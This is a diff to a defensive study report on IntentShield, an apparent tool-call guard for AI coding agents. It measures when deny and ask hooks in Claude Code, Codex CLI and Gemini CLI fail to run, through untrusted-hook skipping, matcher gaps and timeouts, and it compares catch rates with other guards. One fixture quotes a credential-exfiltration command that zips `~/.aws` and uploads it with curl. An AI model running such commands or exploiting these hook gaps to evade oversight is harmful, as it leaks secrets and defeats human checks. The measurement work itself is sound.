@@ -82,7 +82,9 @@ The 218 rows are 83 cells repeated two to five times on a deterministic stub. Th
 nothing about how often a deny is enforced across hooks, builds or users, so the build count is the figure to read. The 47 deny rows
 where the hook did not run are three causes: an untrusted Codex hook is skipped without any signal in `codex exec` (40 rows, 12 builds);
 a Claude Code hook scoped with the natural `mcp__.*` matcher does not see a resource read, which goes through a built-in tool name
-(5 rows); Gemini CLI hooks were opt-in before 0.26.0 (2 rows).
+(5 rows); Gemini CLI hooks were opt-in before 0.26.0 (2 rows). The other 6 of the 271 deny rows are Gemini CLI 0.66.0 rows in
+`--approval-mode default` (3 shell, 3 MCP on an untrusted server) where the hook did not run and the call was blocked anyway, so
+something other than the hook stopped it; they are in neither count.
 
 ## Findings 2 to 4 in detail
 
@@ -99,9 +101,10 @@ a Claude Code hook scoped with the natural `mcp__.*` matcher does not see a reso
   - Gemini CLI's missing-interpreter result is the safe direction (its documentation says such a failure only warns) and changes at
     0.30.0. Timeouts are the only failure class measured across the whole sweep for Claude Code and Codex CLI.
 - **The `onFailure` setting.** Claude Code documents an `onFailure: "block"` key on a hook entry from 2.1.295. The matrix ran with no
-  such key. The key was run in separate cells. On 2.1.316 (3 runs per reply, in `results/hook-fidelity/claude/all-runs.jsonl`) R9, R7,
-  R8, R10a (hook file not executable), R10b, R11 (exit 2, empty stderr) and R13 (missing hook file) were BLOCKED in 3 of 3 runs each,
-  and R5 and R6 still RAN in 3 of 3. On 2.1.281, R9 and R8 RAN in 2 of 2 runs each
+  such key. The key was run in separate cells. On 2.1.316 (3 runs per reply, in `results/hook-fidelity/claude/all-runs.jsonl`) RAN
+  without the key and BLOCKED with it in 3 of 3 runs each for R8 (exit 1), R9 (timeout), R10a (hook file not executable), R10b and R13
+  (missing hook file). R7 (exit 2 with stderr) and R11 (exit 2, empty stderr) were BLOCKED without the key as well, so it changed nothing
+  for them; R5 and R6 still RAN with it in 3 of 3. The counts come from `report_numbers.py` (the `onfailure:` line). On 2.1.281, R9 RAN in 2 of 2 runs with the key and in 2 of 2 without it, and R8 RAN in 2 of 2 with it
   (`results/hook-fidelity/claude/r4-gaps/onfailure/runs.jsonl`). IntentShield's `install` writes the key on Claude Code's `PreToolUse`
   entry (`src/intentshield/install.py`). Since 0.4.3 it also wraps the hook in a launcher that refuses the call when the hook cannot
   start, and gives the hook a 30 s deadline of its own, shorter than the harnesses' timeouts. Only one build was run with the key after
@@ -181,10 +184,13 @@ and are in section 6e of the full record, not here.
 ## The rules since the study
 
 The committed results are the rules as they stood then, and are not regenerated. Since then a deny from the dangerous-command rules wins
-over a session ask. Re-running the committed fixtures through the code of 2026-11-11 changes 51 IntentShield decisions. 48 go from ask to
-deny: 30 rows (10 items) of the 467-fixture set and 18 rows (6 items) of the 214-call set, all harmful credential-exfiltration items. 3
-rows (1 item, `git push -f origin HEAD`) go from deny to ask on the 214-call set, because a force-push to `HEAD` is now an ask. No benign
-row changed and none changed to allow. On the 214-call set the 41 asked and 35 denied become 36 asked and 40 denied; 28 of 104 harmful
+over a session ask. Re-running the committed fixtures through the code of 2026-11-11 (v0.4.3) changes 51 IntentShield decisions. 48 go
+from ask to deny: 30 rows (10 items) of the 467-fixture set and 18 rows (6 items) of the 214-call set, all harmful credential-exfiltration
+items. Through the code on main after 0.4.3 it is 54: 51 go from ask to deny, 33 rows (11 items) of the 467-fixture set, because H117
+(`zip -r - ~/.aws | curl -F f=@- ...`) is now a deny, and the same 18 of the 214-call set. In both, 3 rows (1 item, `git push -f origin
+HEAD`) go from deny to ask on the 214-call set, because a force-push to `HEAD` is now an ask. No benign row changed and none changed to
+allow in the `intentshield` variant; on main, after 0.4.3, `curl -s http://localhost:8000/health` goes from ask to allow in 5 rows of
+the `-always` and `-tainted` variants. On the 214-call set the 41 asked and 35 denied become 36 asked and 40 denied; 28 of 104 harmful
 calls are still let through and the 5 benign asks stay. The figures in the report are the study's, not these, and the denies-alone count
 (24/85) was not recomputed.
 
@@ -291,7 +297,7 @@ builds excluded (neutral control did not run the hook): {'Claude Code': ['2.1.0'
 | Gemini CLI | 28 | 28 | 0 |
 
 [findings]
-deny: deny enforced where the hook ran: 65 of 65 builds, 218/218 [98.3, 100.0]% rows (0 let the call run); the rows are 83 deterministic cells on 65 builds, so the interval bounds repeatability, not a population rate; deny rows where the hook did not run and the call ran: 47 of 271 (Claude Code mcp__.* matcher on a resource read 5, Codex untrusted hook 40, Gemini CLI before 0.26.0 2)
+deny: deny enforced where the hook ran: 65 of 65 builds, 218/218 [98.3, 100.0]% rows (0 let the call run); the rows are 83 deterministic cells on 65 builds, so the interval bounds repeatability, not a population rate; deny rows where the hook did not run and the call ran: 47 of 271 (Claude Code mcp__.* matcher on a resource read 5, Codex untrusted hook 40, Gemini CLI before 0.26.0 2); deny rows where the hook did not run and the call was blocked anyway, in neither count: 6 (Gemini CLI 0.66.0 in mode M1, mcp rows 3, Gemini CLI 0.66.0 in mode M1, shell rows 3)
 ask_claude: Claude Code ask: RAN on 6 builds, BLOCKED on 21 of 27 measured; last RAN 2.1.84, first BLOCKED 2.1.85
 ask_codex: Codex ask: RAN on 12 of 12 builds
 ask_gemini: Gemini ask: RAN on 13, HUNG on 15 of 28 builds; last RAN 0.37.2, first HUNG 0.38.0
@@ -299,6 +305,7 @@ fail_timeout: R9, hook runs past its timeout: Claude Code RAN on 22 of 22; Codex
 fail_empty: R5, empty reply: Claude Code RAN on 1 of 1; Codex CLI RAN on 2 of 2; Gemini CLI RAN on 1 of 1
 fail_exit2: R7, exit 2: Claude Code BLOCKED on 1 of 1; Codex CLI BLOCKED on 12 of 12
 fail_dead: R10b, interpreter missing: Claude Code RAN on 1 of 1; Codex CLI RAN on 2 of 2; Gemini CLI BLOCKED on 22 of 26, RAN on 4 of 26
+onfailure: onFailure block on Claude Code 2.1.316, outcome without the key and with it: changed by the key: R8 (RAN 3 of 3, with the key BLOCKED 3 of 3); R9 (RAN 3 of 3, with the key BLOCKED 3 of 3); R10a (RAN 3 of 3, with the key BLOCKED 3 of 3); R10b (RAN 3 of 3, with the key BLOCKED 3 of 3); R13 (RAN 3 of 3, with the key BLOCKED 3 of 3); already BLOCKED without it: R7, R11; still RAN with it: R5, R6; on 2.1.281 with the key: R9 RAN 2 of 2 (without it: RAN 2 of 2), R8 RAN 2 of 2
 codex_untrusted: Codex untrusted hooks: 70 rows, hook ran in 0, call ran in 70, 12 builds
 codex_bypass: Codex bypass flag: hook did not run on 5 builds (0.131.0 to 0.140.0), ran on 14 builds (0.141.0 to 0.166.0)
 
@@ -308,6 +315,7 @@ fresh_is_after: IntentShield with the rules, same set: lets through 28/104 [19.3
 fresh_vs_safety_net: on safety-net's shell scope, 85 harmful items: safety-net lets through 44/85 [41.3, 62.1]%, IntentShield 25/85 [20.8, 39.8]%
 fresh_denies_only: denies alone on those items: safety-net 41/85, IntentShield 24/85; IntentShield asks on 36 more
 fresh_vs_knox: on knox's scope, 73 harmful items: knox lets through 44/73 [48.8, 70.7]%, IntentShield 18/73 [16.2, 35.6]%; denies alone knox 29, IntentShield 28
+fresh_paired: paired on the same harmful items, exact two-sided sign test on the discordant items: safety-net scope, flagged: only IntentShield 23, only safety-net 4 (p = 0.00031); denies alone: only IntentShield 7, only safety-net 24 (p = 0.0033); knox scope, flagged: only IntentShield 30, only knox 4 (p = 6.2e-06); denies alone: only IntentShield 17, only knox 18 (p = 1)
 fresh_benign: benign calls: IntentShield asks on 5 of 110, denies 0; safety-net denies 4 of 100
 fresh_benign_same_scope: benign calls, 214-item set, on the same items: on safety-net's shell scope IntentShield asks on 4/100 [1.6, 9.8]% and denies 0, safety-net denies 4/100 [1.6, 9.8]%; on knox's scope IntentShield asks on 5/74 [2.9, 14.9]% and knox flags 0/74 [0.0, 4.9]%
 fresh_discovery: fresh set without the 9 discovery-only items: IntentShield with the rules lets through 19/95 [13.2, 29.1]% of the harmful calls (28/104 with them); on safety-net's shell scope, safety-net 36/77 [36.0, 57.8]% and IntentShield 17/77 [14.3, 32.5]%; on knox's scope, knox 39/68 [45.5, 68.4]% and IntentShield 13/68 [11.5, 30.0]%; each of these three guards let every discovery-only item in its scope through
